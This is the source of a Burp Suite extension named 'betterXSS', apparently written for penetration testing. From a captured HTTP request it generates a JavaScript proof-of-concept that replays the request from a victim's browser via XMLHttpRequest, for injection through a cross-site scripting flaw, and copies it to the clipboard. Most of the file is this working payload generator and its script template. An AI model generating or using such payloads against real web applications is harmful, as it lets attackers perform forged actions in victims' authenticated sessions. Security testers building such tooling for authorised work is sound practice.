from burp import IBurpExtender
from burp import IParameter
#from burp import IMenuItemHandler
from burp import IContextMenuFactory
from burp import IExtensionHelpers
from burp import IRequestInfo
from javax.swing import JMenuItem
from java.awt.datatransfer import Clipboard,StringSelection
from java.awt import Toolkit
from java.awt.event import ActionListener
from java.awt.event import ActionEvent
from java.awt.event import KeyEvent
class BurpExtender(IBurpExtender, IContextMenuFactory, ActionListener):


  def __init__(self):
    self.menuItem = JMenuItem('Generate betterXSS PoC')
    self.menuItem.addActionListener(self)
          
  def _build(self):
    #Grab first selected message, bail if none
    iRequestInfo = self._helpers.analyzeRequest(self.ctxMenuInvocation.getSelectedMessages()[0])
    if iRequestInfo is None:
      print('Request info object is null, bailing')
      return


    method = iRequestInfo.getMethod();

    url = iRequestInfo.getUrl();

    parms = filter(lambda x: x.getType() == IParameter.PARAM_BODY, iRequestInfo.getParameters());
    #print('parms ' + ''.join(parms))

    c = iRequestInfo.getContentType();
    if (c == -1):
      print 'error: unknown content type';
    elif (c == 0):
      print 'error: no content type';

    elif (c == 1):
      enc =  'application/x-www-form-urlencoded';
      if len(parms) > 0:
          p = ['%s=%s' % (p.getName(), p.getValue()) for p in parms];
          postData = '%s' % ( '&'.join(p));

    elif (c == 2):
      enc =  'multipart/form-data';
      if len(parms) > 0:
          p = ['%s=%s' % (p.getName(), p.getValue()) for p in parms];
          postData = '%s' % ( '&'.join(p));

    elif (c == 3):
      enc =  'text/xml';
    elif (c == 4):
      enc = 'application/json';
    elif (c == 5):
      p = ['%s:%s' % (p.getName(), p.getValue()) for p in parms];
      enc = 'application/x-amf';

    base = '''
<!-- betterXSS PoC - generated with love by thatpentestguy -->
<script>
function sendRequest(method, url, enc, postData) {
  var req = createXMLHTTPObject();
  if (!req) return;
  req.open(method,url,true);
  if (typeof enc !== 'undefined'){
    req.setRequestHeader('Content-type', enc)
  }
  req.onreadystatechange = function () {
    if (req.readyState != 4) return;
    if (req.status != 200 && req.status != 304) {
      return;
    }
  }
  if (req.readyState == 4) return;
  (typeof postData === 'undefined') ? req.send() : req.send(postData);
}

var XMLHttpFactories = [
  function () {return new XMLHttpRequest()},
  function () {return new ActiveXObject("Msxml2.XMLHTTP")},
  function () {return new ActiveXObject("Msxml3.XMLHTTP")},
  function () {return new ActiveXObject("Microsoft.XMLHTTP")}
];

function createXMLHTTPObject() {
  var xmlhttp = false;
  for (var i=0;i<XMLHttpFactories.length;i++) {
    try {
      xmlhttp = XMLHttpFactories[i]();
    }
    catch (e) {
      continue;
    }
    break;
  }
  return xmlhttp;
}'''

    if (1 <= c <= 5):
      base = base + 'sendRequest(\'%s\',\'%s\',\'%s\',\'%s\');' % (method, url, enc, postData)
    else:    
      base = base + 'sendRequest(\'%s\',\'%s\');' % (method, url)
    base = base + '\n</script>'

    s = StringSelection(base)                                                                                                                                                                                                        
    Toolkit.getDefaultToolkit().getSystemClipboard().setContents(s,s) #put string on clipboard            
    print(base)

  def actionPerformed(self, actionEvent):
    self._build()

  def registerExtenderCallbacks(self, callbacks):
    self._helpers = callbacks.getHelpers()
    callbacks.setExtensionName('betterXSS')
    callbacks.registerContextMenuFactory(self)
    self.mCallBacks = callbacks
    print('betterXSS successfully loaded')
    return
  
  def createMenuItems(self, ctxMenuInvocation):
    self.ctxMenuInvocation = ctxMenuInvocation
    return [self.menuItem]

